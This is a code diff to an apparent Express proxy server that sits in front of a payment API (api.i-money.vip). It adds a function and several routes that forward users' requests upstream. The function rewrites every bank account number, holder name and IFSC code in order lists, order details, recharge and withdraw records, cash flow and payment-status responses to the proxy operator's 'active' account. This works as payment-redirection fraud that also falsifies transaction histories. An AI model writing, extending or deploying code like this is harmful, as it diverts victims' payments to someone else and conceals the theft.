@@ -372,6 +372,87 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
   }
 }
 
+function replaceBankInObject(obj, active) {
+  if (!obj || !active) return;
+  const bankFields = {
+    receiveAccountNo: active.accountNo,
+    receiveAccountName: active.accountHolder,
+    receiveIfsc: active.ifsc,
+    accountNo: active.accountNo,
+    accountName: active.accountHolder,
+    accountHolder: active.accountHolder,
+    ifsc: active.ifsc,
+    ifscCode: active.ifsc,
+    bankAccountNo: active.accountNo,
+    bankAccountName: active.accountHolder,
+    bankIfsc: active.ifsc
+  };
+  for (const [key, val] of Object.entries(bankFields)) {
+    if (obj[key] !== undefined) obj[key] = val;
+  }
+}
+
+async function proxyAndReplaceBankInList(req, res) {
+  const bankData = await loadData();
+  const active = getActiveBank(bankData);
+
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const forwardHeaders = {};
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' ||
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      forwardHeaders[key] = val;
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
+
+    const opts = { method: req.method, headers: forwardHeaders };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      forwardHeaders['content-length'] = String(req.rawBody.length);
+    }
+
+    const response = await fetch(url, opts);
+    const respBody = await response.text();
+
+    let jsonResp;
+    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
+
+    if (jsonResp && active) {
+      if (jsonResp.data) {
+        if (Array.isArray(jsonResp.data)) {
+          jsonResp.data.forEach(item => replaceBankInObject(item, active));
+        } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
+          jsonResp.data.list.forEach(item => replaceBankInObject(item, active));
+        } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
+          jsonResp.data.records.forEach(item => replaceBankInObject(item, active));
+        } else {
+          replaceBankInObject(jsonResp.data, active);
+        }
+      }
+    }
+
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+
+    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+
+    res.writeHead(response.status, respHeaders);
+    res.end(finalBody);
+  } catch (e) {
+    console.error('Proxy+list replace error:', req.method, req.originalUrl, e.message);
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+}
+
 app.post('/money/orderId', async (req, res) => {
   await proxyAndReplaceBankDetails(req, res, 'New Order!');
 });
@@ -382,6 +463,32 @@ app.post('/money/create/v2', async (req, res) => {
 
 app.post('/money/init/order', async (req, res) => {
   await proxyAndReplaceBankDetails(req, res, 'Init Order!');
+});
+
+app.all('/money/order/list', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/money/list/v2', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/money/order/detail', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/money/orderDetail', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/money/rechargeRecord', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/money/withdrawRecord', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+app.all('/user/cashFlow', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
+});
+
+app.post('/money/check/payStatus', async (req, res) => {
+  await proxyAndReplaceBankInList(req, res);
 });
 
 app.get('/health', async (req, res) => {
